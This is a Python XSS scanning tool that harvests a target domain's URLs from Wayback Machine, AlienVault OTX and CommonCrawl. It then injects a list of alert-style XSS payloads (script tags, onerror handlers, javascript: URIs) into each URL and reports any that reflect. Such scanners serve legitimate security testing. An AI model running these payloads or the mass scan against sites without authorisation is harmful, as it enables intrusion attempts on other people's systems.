import sys
import requests
import argparse
import numpy as np
import threading
import urllib.parse as urlparse
import requests.packages.urllib3
from jinja2 import Environment, FileSystemLoader
import sqlite3

requests.packages.urllib3.disable_warnings()

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# Define a list of XSS payloads to test
xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    # Add more payloads here
]

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED} Advance XSS Reporter')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("-t", "--thread", dest="thread", help="Number of Threads to Used. Default=50", default=50)
    parser.add_argument("-o", "--output", dest="output", help="Save Vulnerable URLs in TXT file")
    parser.add_argument("-s", "--subs", dest="want_subdomain", help="Include Result of Subdomains", action='store_true')
    parser.add_argument("--deepcrawl", dest="deepcrawl", help="Uses All Available APIs of CommonCrawl for Crawling URLs [**Takes Time**]", action='store_true')
    parser.add_argument("--report", dest="report_file", help="Generate an HTML report", default=None)

    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("-l", "--list", dest="url_list", help="URLs List, ex:- google_urls.txt")
    required_arguments.add_argument("-d", "--domain", dest="domain", help="Target Domain Name, ex:- testphp.vulnweb.com")
    return parser.parse_args()

def readTargetFromFile(filepath):
    urls_list = []
    with open(filepath, "r") as f:
        for urls in f.readlines():
            if urls != "":
                urls_list.append(urls.strip())
    return urls_list

class PassiveCrawl:
    def __init__(self, domain, want_subdomain, threadNumber, deepcrawl):
        self.domain = domain
        self.want_subdomain = want_subdomain
        self.deepcrawl = deepcrawl
        self.threadNumber = threadNumber
        self.final_url_list = set()  # Use a set to eliminate duplicates

    def start(self):
        if self.deepcrawl:
            self.startDeepCommonCrawl()
        else:
            self.getCommonCrawlURLs(self.domain, self.want_subdomain, ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"])

        urls_list1 = self.getWaybackURLs(self.domain, self.want_subdomain)
        urls_list2 = self.getOTX_URLs(self.domain)

        self.final_url_list.update(urls_list1)  # Use update to add elements to the set
        self.final_url_list.update(urls_list2)

        return list(self.final_url_list)  # Convert the set back to a list

    def getIdealDomain(self, domainName):
        final_domain = domainName.replace("http://", "")
        final_domain = final_domain.replace("https://", "")
        final_domain = final_domain.replace("/", "")
        final_domain = final_domain.replace("www", "")
        return final_domain

    def split_list(self, list_name, total_part_num):
        final_list = []
        split = np.array_split(list_name, total_part_num)
        for array in split:
            final_list.append(list(array))
        return final_list

    def make_GET_Request(self, url, response_type):
        response = requests.get(url)
        if response_type.lower() == "json":
            result = response.json()
        else:
            result = response.text
        return result

    def getWaybackURLs(self, domain, want_subdomain):
        if want_subdomain == True:
            wild_card = "*."
        else:
            wild_card = ""

        url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
        urls_list = self.make_GET_Request(url, "json")
        try:
            urls_list.pop(0)
        except:
            pass

        final_urls_list = set()  # Use a set to eliminate duplicates
        for url in urls_list:
            final_urls_list.add(url[0])  # Use add to add elements to the set

        return list(final_urls_list)  # Convert the set back to a list

    def getOTX_URLs(self, domain):
        url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
        raw_urls = self.make_GET_Request(url, "json")
        urls_list = raw_urls["url_list"]

        final_urls_list = set()  # Use a set to eliminate duplicates
        for url in urls_list:
            final_urls_list.add(url["url"])  # Use add to add elements to the set

        return list(final_urls_list)  # Convert the set back to a list

    def startDeepCommonCrawl(self):
        api_list = self.get_all_api_CommonCrawl()
        collection_of_api_list = self.split_list(api_list, int(self.threadNumber))

        thread_list = []
        for thread_num in range(int(self.threadNumber)):
            t = threading.Thread(target=self.getCommonCrawlURLs, args=(self.domain, self.want_subdomain, collection_of_api_list[thread_num],))
            thread_list.append(t)

        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()

    def get_all_api_CommonCrawl(self):
        url = "http://index.commoncrawl.org/collinfo.json"
        raw_api = self.make_GET_Request(url, "json")
        final_api_list = []

        for items in raw_api:
            final_api_list.append(items["cdx-api"])

        return final_api_list

    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
        if want_subdomain == True:
            wild_card = "*."
        else:
            wild_card = ""

        final_urls_list = set()  # Use a set to eliminate duplicates

        for api in apiList:
            url = f"{api}?url={wild_card+domain}/*&fl=url"
            raw_urls = self.make_GET_Request(url, "text")

            if ("No Captures found for:" not in raw_urls) and ("<title>" not in raw_urls):
                urls_list = raw_urls.split("\n")

                for url in urls_list:
                    if url != "":
                        final_urls_list.add(url)  # Use add to add elements to the set

        return list(final_urls_list)  # Convert the set back to a list

class XSSScanner:
    def __init__(self, url_list, threadNumber, report_file):
        self.url_list = url_list
        self.threadNumber = threadNumber
        self.vulnerable_urls = []
        self.report_file = report_file

    def start(self):
        print("[>>] [Scanning for XSS vulnerabilities]")
        print("=========================================================================")
        thread_list = []
        for thread_num in range(int(self.threadNumber)):
            t = threading.Thread(target=self.scan_urls_for_xss, args=(self.url_list,))
            thread_list.append(t)

        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()

        if self.report_file:
            self.store_vulnerabilities_in_sqlite()
            self.generate_report()

        return self.vulnerable_urls

    def split_list(self, list_name, total_part_num):
        final_list = []
        split = np.array_split(list_name, total_part_num)
        for array in split:
            final_list.append(list(array))
        return final_list

    def test_xss_vulnerabilities(self, url):
        for payload in xss_payloads:
            # Construct the payload-injected URL
            payload_url = url + "?param=" + payload
            try:
                response = requests.get(payload_url, verify=False)
                # Check the response for signs of XSS
                if payload in response.text:
                    print(f"Potential XSS vulnerability found in URL: {payload_url}")
                    self.vulnerable_urls.append(payload_url)
            except Exception as e:
                # Handle request errors
                pass

    def store_vulnerabilities_in_sqlite(self):
        conn = sqlite3.connect("xss_vulnerabilities.db")
        cursor = conn.cursor()

        cursor.execute("CREATE TABLE IF NOT EXISTS vulnerabilities (url TEXT)")
        conn.commit()

        for url in self.vulnerable_urls:
            cursor.execute("INSERT INTO vulnerabilities (url) VALUES (?)", (url,))
            conn.commit()

        conn.close()

    def generate_report(self):
        env = Environment(loader=FileSystemLoader('.'))
        template = env.get_template('report_template.html')
        report_content = template.render(vulnerable_urls=self.vulnerable_urls)

        with open(self.report_file, "w") as f:
            f.write(report_content)

    def scan_urls_for_xss(self, url_list):
        for url in url_list:
            self.test_xss_vulnerabilities(url)

if __name__ == '__main__':
    arguments = get_arguments()

    if arguments.domain:
        print("=========================================================================")
        print("[>>] Crawling URLs from: WaybackMachine, AlienVault OTX, CommonCrawl ...")
        crawl = PassiveCrawl(arguments.domain, arguments.want_subdomain, arguments.thread, arguments.deepcrawl)
        final_url_list = crawl.start()

    elif arguments.url_list:
        final_url_list = readTargetFromFile(arguments.url_list)

    else:
        print("[!] Please Specify --domain or --list flag ..")
        print(f"[*] Type: {sys.argv[0]} --help")
        sys.exit()

    print("=========================================================================")
    print("[>>] [Total URLs] : ", len(final_url_list))

    scan = XSSScanner(final_url_list, arguments.thread, arguments.report_file)
    vulnerable_urls = scan.start()

    print("=========================================================================")
    for url in vulnerable_urls:
        print(url)
    print("\n[>>] [Total Confirmed XSS Vulnerabilities] : ", len(vulnerable_urls))
